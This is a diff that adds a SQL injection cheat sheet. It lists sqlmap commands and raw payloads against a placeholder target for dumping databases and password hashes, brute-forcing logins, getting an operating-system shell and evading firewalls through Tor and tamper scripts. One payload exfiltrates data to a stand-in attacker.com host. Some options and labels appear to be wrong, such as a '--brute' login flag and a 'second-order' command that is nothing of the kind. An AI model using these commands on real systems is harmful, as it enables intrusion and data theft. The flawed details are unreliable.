@@ -1,0 +1,104 @@
+Basic SQLmap Commands
+Basic SQL Injection Testing
+sqlmap -u "http://target.com/page?id=1"
+
+Test for a specific parameter
+sqlmap -u "http://target.com/page?id=1" --data="param=value"
+
+Force a specific technique (e.g., Boolean-based Blind)
+sqlmap -u "http://target.com/page?id=1" --technique=B
+
+Enumerate Database
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+Enumerate Tables in a Database
+sqlmap -u "http://target.com/page?id=1" -D <database_name> --tables
+
+Enumerate Columns in a Table
+sqlmap -u "http://target.com/page?id=1" -D <database_name> -T <table_name> --columns
+
+Dump Data from a Table
+sqlmap -u "http://target.com/page?id=1" -D <database_name> -T <table_name> --dump
+
+Get DBMS Information
+sqlmap -u "http://target.com/page?id=1" --banner
+
+Perform a Full Enumeration (Databases, Tables, Columns, Data)
+sqlmap -u "http://target.com/page?id=1" --all
+
+Payloads for SQL Injection Testing
+Boolean-based Blind SQLi
+True / False Test
+id=1' AND 1=1 --
+id=1' AND 1=2 --
+Time-based Blind SQLi
+Sleep Delay
+id=1' AND SLEEP(5) --
+Error-based SQLi
+Generate Error
+id=1' AND 1=CONVERT(int, (SELECT @@version)) --
+Union-based SQLi
+Union Injection with Columns
+id=1' UNION SELECT null, null, null --
+Out-of-Band (OOB) SQLi
+DNS Exfiltration
+id=1' UNION SELECT null, null, load_file('\\attacker.com\file.txt') --
+Time-based with Union
+Time Delay with Union Select
+id=1' UNION SELECT NULL, SLEEP(5) --
+Second-Order SQLi
+Inject into a Stored Procedure or Function
+id=1' -- Inject into stored procedure or function later
+Common SQLmap Options
+Set Proxy
+sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"
+
+Enable Tor
+sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5
+
+Use a Custom User-Agent
+sqlmap -u "http://target.com/page?id=1" --user-agent="Mozilla/5.0"
+
+Post Request with Data
+sqlmap -u "http://target.com/page" --data="param=value&id=2"
+
+Tamper Scripts (Bypass WAFs)
+sqlmap -u "http://target.com/page?id=1" --tamper="between"
+
+Use Cookies
+sqlmap -u "http://target.com/page?id=1" --cookie="sessionid=abc123"
+
+Limit Results / Number of Rows
+sqlmap -u "http://target.com/page?id=1" --first=1 --last=10 --threads=5
+
+Output to File
+sqlmap -u "http://target.com/page?id=1" --output-dir=/path/to/dir
+
+Advanced Features
+Identify and Exploit Blind SQL Injection
+sqlmap -u "http://target.com/page?id=1" --technique=B --level=5 --risk=3
+
+Dump Password Hashes
+sqlmap -u "http://target.com/page?id=1" -D <database> -T users --dump --passwords
+
+Brute Force Authentication
+sqlmap -u "http://target.com/login" --data="username=admin&password=admin" --brute --threads=10
+
+Check for Common Database Fingerprints
+sqlmap -u "http://target.com/page?id=1" --fingerprint
+
+Exploit Second-Order SQLi (Inject payload in one request and exploit in another)
+sqlmap -u "http://target.com/firstpage?id=1" --data="param=1&other=2"
+
+Execute System Commands (Out-of-Band)
+sqlmap -u "http://target.com/page?id=1" --os-shell
+
+SQL Injection Techniques Supported by SQLmap
+Boolean-based Blind
+Time-based Blind
+Error-based
+Union-based
+Stacked Queries
+Out-of-Band (DNS, HTTP)
+Second-Order Injection
+File-based Attacks
